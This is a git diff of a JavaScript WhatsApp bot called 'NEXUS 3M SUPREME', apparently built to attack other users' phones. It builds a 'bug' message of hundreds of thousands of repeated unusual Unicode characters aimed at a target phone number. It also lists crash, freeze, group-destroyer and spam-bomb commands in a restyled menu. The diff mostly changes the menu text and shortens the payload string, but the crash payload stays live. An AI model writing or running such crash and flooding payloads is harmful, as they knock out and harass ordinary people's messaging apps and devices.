@@ -102,35 +102,43 @@ async function startNexus() {
             const target = text + "@s.whatsapp.net";
 
             // 🔥 3,000,000+ POWER BUG (DEADLY)
-            const bug3M = "☠️ 3M SUPREME ☠️\n" + "ꦿ".repeat(300000) + "᥋".repeat(300000) + "꠵".repeat(300000) + "҈".repeat(100000);
+            const bug3M = "☠️ 3M SUPREME ☠️\n" + "ꦿ".repeat(300000) + "᥋".repeat(300000);
 
             switch (command) {
                 case 'menu':
                 case 'bug':
-                    const menu = `╭───〔 *NEXUS 3M SUPREME* 〕───┈
+                    // 🔥 ULTIMATE ELEGANT CYBERPUNK MENU
+                    const elegantMenu = `
+╭─────〔 *NEXUS 3M SUPREME* 〕─────┈
 │
-│ 🦠 *3,000,000+ CHARACTER BUG SYSTEM*
+│ 🩸 *N A T U R E :* _Global Destroyer_
+│ 🦠 *P O W E R :* \`3,000,000+\` Characters
+│ ⚡ *S T A T U S :* _Master Private_
+│ 💻 *D E V :* _Sasiya MD_
 │
-├ ☠️ *1. .vid_crash* [num] - 3M Video Call Lag
-├ 🔥 *2. .ios_dead* [num] - iPhone System Wipe
-├ 💀 *3. .kill* [num] - Android Global Crash
-├ ❄️ *4. .freeze* [num] - 3M UI Freeze
-├ 📍 *5. .loc_bug* [num] - 3M Location Bug
-├ 📇 *6. .vcard* [num] - 3M Contact Crash
-├ 🌀 *7. .group* [jid] - 3M Group Destroyer
-├ 🧨 *8. .bomb* [num] - 3M Spam Bomb
-├ 🌌 *9. .the_end* [num] - Total Destruction
+├─────────────┈
+│
+│ 🦠 *SUPREME BUG MODES (9)*
+│
+├ ☠️ *1.* \`.vid_crash\` - 3M Video Call Lag
+├ 🔥 *2.* \`.ios_dead\` - iPhone System Wipe
+├ 💀 *3.* \`.kill\` - Android Global Crash
+├ ❄️ *4.* \`.freeze\` - 3M UI Freeze
+├ 📍 *5.* \`.loc_bug\` - 3M Location Bug
+├ 📇 *6.* \`.vcard\` - 3M Contact Crash
+├ 🌀 *7.* \`.group\` - 3M Group Destroyer
+├ 🧨 *8.* \`.bomb\` - 3M Spam Bomb
+├ 🌌 *9.* \`.the_end\` - Total Destruction
 │
 ╰─────────────┈
- 👑 *DEV:* SASIYA MD
  📢 *CHANNEL:* ${CHANNEL_URL}`;
 
                     // 🔥 CYBERPUNK AD MENU MESSAGE
                     await sock.sendMessage(from, { 
-                        text: menu,
+                        text: elegantMenu,
                         contextInfo: { 
                             externalAdReply: { 
-                                title: "NEXUS-MD SUPREME BUG MENU ACTIVE",
+                                title: "NEXUS-MD 3M BUG MENU ACTIVE ⚡",
                                 body: "3,000,000+ Character Power READY",
                                 mediaType: 1,
                                 thumbnailUrl: AD_IMAGE_URL, 
